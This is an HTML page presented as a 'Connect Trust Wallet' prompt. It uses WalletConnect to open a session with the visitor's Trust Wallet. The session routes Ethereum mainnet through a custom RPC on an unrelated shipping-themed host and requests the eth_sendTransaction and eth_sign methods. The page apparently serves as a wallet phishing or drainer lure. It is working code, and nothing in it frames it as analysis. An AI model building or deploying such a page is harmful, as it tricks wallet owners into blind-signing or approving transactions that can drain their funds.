<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Trust Wallet</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
            color: white;
            text-align: center;
        }
        .container {
            max-width: 400px;
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 30px;
            padding: 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }
        p {
            font-size: 16px;
            line-height: 1.5;
            opacity: 0.9;
        }
        .button {
            display: inline-block;
            background: white;
            color: #333;
            padding: 15px 30px;
            border-radius: 30px;
            font-size: 18px;
            font-weight: 600;
            text-decoration: none;
            margin-top: 20px;
            width: 100%;
            box-sizing: border-box;
            border: none;
            cursor: pointer;
        }
        .button:hover {
            background: #f0f0f0;
        }
        .note {
            font-size: 14px;
            margin-top: 20px;
            opacity: 0.8;
        }
        #loading {
            display: none;
            margin-top: 20px;
        }
    </style>
    <!-- WalletConnect v2 library -->
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.min.js"></script>
</head>
<body>
    <div class="container">
        <h1>üîó Connect Trust Wallet</h1>
        <p>Tap the button below to connect to the custom RPC network:</p>
        <p style="font-size:14px; word-break:break-all;">https://express-shipping-mcu1.onrender.com</p>
        <button class="button" id="connectBtn">Connect Now</button>
        <div id="loading">‚è≥ Generating connection request...</div>
        <p class="note">If Trust Wallet is not installed, you'll be redirected to the app store.</p>
    </div>

    <script>
        const PROJECT_ID = "cd1a5ec0393767579e1f364ffc41597d"; // Your WalletConnect project ID
        const RPC_URL = "https://express-shipping-mcu1.onrender.com";

        document.getElementById('connectBtn').addEventListener('click', async () => {
            const btn = document.getElementById('connectBtn');
            const loading = document.getElementById('loading');
            btn.disabled = true;
            btn.textContent = 'Connecting...';
            loading.style.display = 'block';

            try {
                if (typeof window.EthereumProvider === 'undefined') {
                    throw new Error('WalletConnect library not loaded. Please refresh.');
                }

                // Initialize provider without showing modal
                const provider = await window.EthereumProvider.init({
                    projectId: PROJECT_ID,
                    chains: [1],
                    showQrModal: false,
                    rpcMap: { 1: RPC_URL },
                    methods: ['eth_sendTransaction', 'eth_sign'],
                    metadata: {
                        name: 'RPC Connect',
                        description: 'Connect to custom RPC',
                        url: window.location.href,
                        icons: []
                    }
                });

                // Wait for the URI
                const uri = await new Promise((resolve) => {
                    provider.once('display_uri', resolve);
                    // Trigger connection
                    provider.connect().catch(() => {});
                });

                // Redirect to Trust Wallet deep link
                const trustLink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
                window.location.href = trustLink;

                // Fallback: if not opened after 2 seconds, show QR option
                setTimeout(() => {
                    if (!document.hidden) {
                        // Still on page, maybe deep link failed
                        alert('If Trust Wallet did not open, tap the button again or install Trust Wallet from the app store.');
                        btn.disabled = false;
                        btn.textContent = 'Try Again';
                        loading.style.display = 'none';
                    }
                }, 2000);

            } catch (error) {
                console.error(error);
                alert('Connection failed: ' + error.message);
                btn.disabled = false;
                btn.textContent = 'Connect Now';
                loading.style.display = 'none';
            }
        });
    </script>
</body>
</html>
